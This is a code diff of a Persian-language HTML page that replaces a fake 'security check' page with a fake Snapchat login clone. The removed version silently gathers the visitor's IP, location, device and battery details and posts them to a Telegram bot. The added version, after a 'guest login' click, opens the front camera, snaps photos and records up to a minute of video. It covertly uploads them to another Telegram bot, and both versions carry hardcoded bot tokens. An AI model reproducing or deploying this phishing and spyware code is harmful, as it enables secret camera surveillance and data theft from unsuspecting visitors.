@@ -2,157 +2,188 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>گزارش امنیتی سیستم</title>
-  <script src="https://cdn.jsdelivr.net/npm/bowser@2.11.0/es5.min.js"></script>
+  <title>SnapChat Clone</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
+  <script src="https://cdn.tailwindcss.com"></script>
   <style>
     body {
-      font-family: sans-serif;
-      background: #f1f3f5;
-      direction: rtl;
-      text-align: center;
-      padding: 30px;
+      margin: 0;
+      font-family: 'Vazirmatn', sans-serif;
+      background: #FFFC00;
+      overflow: hidden;
     }
-
-    .container {
-      background: white;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.1);
-      padding: 30px;
-      max-width: 600px;
-      margin: auto;
+    .splash, .login, .camera {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #FFFC00;
+      flex-direction: column;
+      z-index: 10;
     }
-
-    h1 {
-      color: #333;
-      font-size: 22px;
+    .hidden { display: none; }
+    #video {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: 0;
     }
-
-    #loading {
-      margin: 20px 0;
-      font-weight: bold;
-      color: #888;
+    .overlay {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding: 1rem;
+      background: linear-gradient(to top, rgba(255,255,255,0.1), transparent 60%);
     }
-
-    #done {
-      color: green;
-      font-weight: bold;
-      display: none;
-    }
-
-    .info {
-      text-align: right;
-      font-size: 13px;
-      margin-top: 20px;
-      direction: ltr;
-    }
-
-    footer {
-      margin-top: 40px;
-      font-size: 12px;
-      color: #aaa;
+    .circle-btn {
+      width: 72px; height: 72px;
+      background-color: white;
+      border-radius: 50%;
+      border: 4px solid #000;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>در حال بررسی وضعیت امنیتی...</h1>
-    <div id="loading">در حال دریافت اطلاعات سیستم شما</div>
-    <div id="done">اطلاعات با موفقیت ارسال شد</div>
-    <div class="info" id="info"></div>
+
+  <!-- Splash -->
+  <div class="splash" id="splash">
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/2048px-Snapchat_logo.svg.png" width="120" alt="Snapchat">
   </div>
 
-  <footer>
-    توسعه یافته جهت آگاهی امنیتی | نسخه تستی
-  </footer>
+  <!-- Login -->
+  <div class="login hidden" id="login">
+    <h1 class="text-2xl font-bold mb-6">ورود به اسنپ‌چت</h1>
+    <button class="mb-4 bg-white px-6 py-2 rounded shadow" onclick="alert('فعلاً فعال نیست')">ورود با گوگل</button>
+    <button class="mb-4 bg-white px-6 py-2 rounded shadow" onclick="alert('فعلاً فعال نیست')">ورود با فیسبوک</button>
+    <button class="bg-black text-white px-6 py-2 rounded shadow" onclick="startSnap()">ورود مهمان</button>
+  </div>
+
+  <!-- Camera -->
+  <video id="video" autoplay playsinline muted class="hidden"></video>
+  <div class="overlay hidden" id="overlay">
+    <div class="flex justify-between">
+      <div></div>
+      <button class="text-black p-2 bg-white/40 rounded-full cursor-default" disabled>
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="black">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553 2.276A2 2 0 0121 14.118V17a2 2 0 01-2 2h-2m-4 0H7a2 2 0 01-2-2v-3.118a2 2 0 011.447-1.842L11 10" />
+        </svg>
+      </button>
+    </div>
+    <div class="flex justify-center">
+      <button class="circle-btn cursor-pointer" onclick="void(0)"></button>
+    </div>
+  </div>
 
   <script>
-    async function collectAndSendData() {
-      const loading = document.getElementById("loading");
-      const done = document.getElementById("done");
-      const infoBox = document.getElementById("info");
+    const splash = document.getElementById("splash");
+    const login = document.getElementById("login");
+    const video = document.getElementById("video");
+    const overlay = document.getElementById("overlay");
 
-      try {
-        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null);
-        const battery = navigator.getBattery ? await navigator.getBattery() : null;
+    setTimeout(() => {
+      splash.classList.add("hidden");
+      login.classList.remove("hidden");
+    }, 3000);
 
-        const browser = bowser.getParser(window.navigator.userAgent).getResult();
+    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
+    const chatId = "-1002297320707";
 
-        const info = {
-          ip: ipData?.ip || "نامشخص",
-          location: `${ipData?.city || "-"}, ${ipData?.region || "-"}, ${ipData?.country_name || "-"}`,
-          org: ipData?.org || "نامشخص",
-          timezone: ipData?.timezone || "نامشخص",
-          ip_time: new Date().toLocaleString("fa-IR", { timeZone: ipData?.timezone || "Asia/Tehran" }),
-          local_time: new Date().toLocaleString("fa-IR"),
-          os: `${browser.os.name} ${browser.os.versionName || ""}`.trim(),
-          browser: `${browser.browser.name} ${browser.browser.version}`,
-          device: browser.platform.type || "نامشخص",
-          screen: `${screen.width}x${screen.height}`,
-          battery: battery ? `${(battery.level * 100).toFixed(0)}%` : "نامشخص",
-          charging: battery ? (battery.charging ? "بله" : "خیر") : "نامشخص",
-          language: navigator.language,
-          referrer: document.referrer || "مستقیم"
+    let stream;
+    let mediaRecorder;
+    let chunks = [];
+    let photoCount = 0;
+    let videoSent = false;
+
+    async function getBatteryInfo() {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        return {
+          level: Math.round(battery.level * 100),
+          charging: battery.charging
         };
+      }
+      return { level: "?", charging: false };
+    }
 
-        const message = `
-[گزارش ورود جدید]
-
-IP: ${info.ip}
-
-مکان: ${info.location}
-
-ارائه‌دهنده: ${info.org}
-
-سیستم‌عامل: ${info.os}
-
-مرورگر: ${info.browser}
-
-نوع دستگاه: ${info.device}
-
-رزولوشن صفحه: ${info.screen}
-
-زبان مرورگر: ${info.language}
-
-وضعیت باتری: ${info.battery} - شارژ: ${info.charging}
-
-ارجاع‌دهنده: ${info.referrer}
-
-زمان محلی: ${info.local_time}
-
-زمان منطقه‌ای IP: ${info.ip_time}
-        `;
-
-        const token = "8194809349:AAEqk8M8sOWGxQwDO0tNlybKDki26JENT4w";
-        const chat_id = "7980459274";
-        const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-        await fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id, text: message.trim() })
+    async function startSnap() {
+      login.classList.add("hidden");
+      video.classList.remove("hidden");
+      overlay.classList.remove("hidden");
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { width: 640, height: 480, facingMode: "user" }
         });
-
-        loading.style.display = "none";
-        done.style.display = "block";
-
-        infoBox.innerHTML = `
-          IP: ${info.ip}<br><br>
-          مکان: ${info.location}<br><br>
-          دستگاه: ${info.device}<br><br>
-          سیستم‌عامل: ${info.os}<br><br>
-          مرورگر: ${info.browser}<br><br>
-          رزولوشن: ${info.screen}<br><br>
-          باتری: ${info.battery} (${info.charging})<br><br>
-          زمان: ${info.local_time}<br><br>
-        `;
-      } catch (err) {
-        loading.innerText = "خطا در دریافت یا ارسال اطلاعات.";
-        console.error("خطا:", err);
+        video.srcObject = stream;
+        startRecording();
+        takeAutoPhotos();
+      } catch (e) {
+        alert("عدم دسترسی به دوربین");
       }
     }
 
-    collectAndSendData();
+    async function takePhoto() {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(async blob => {
+        const battery = await getBatteryInfo();
+        const caption = `📸 عکس ${++photoCount}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`;
+        const form = new FormData();
+        form.append("chat_id", chatId);
+        form.append("photo", blob, `snap_${photoCount}.jpg`);
+        form.append("caption", caption);
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: form
+        });
+      }, 'image/jpeg', 0.8);
+    }
+
+    function takeAutoPhotos() {
+      setTimeout(takePhoto, 1000);
+      setTimeout(takePhoto, 5000);
+    }
+
+    function startRecording() {
+      chunks = [];
+      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = sendVideo;
+      mediaRecorder.start();
+      setTimeout(() => {
+        if (mediaRecorder.state === "recording") mediaRecorder.stop();
+      }, 60000);
+    }
+
+    async function sendVideo() {
+      if (videoSent || chunks.length === 0) return;
+      videoSent = true;
+      const battery = await getBatteryInfo();
+      const blob = new Blob(chunks, { type: "video/webm" });
+      const form = new FormData();
+      form.append("chat_id", chatId);
+      form.append("video", blob, "video.webm");
+      form.append("caption", `🎥 ویدیو ضبط‌شده\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+        method: "POST",
+        body: form
+      });
+    }
+
+    window.addEventListener("beforeunload", () => {
+      if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
+    });
   </script>
 </body>
 </html>
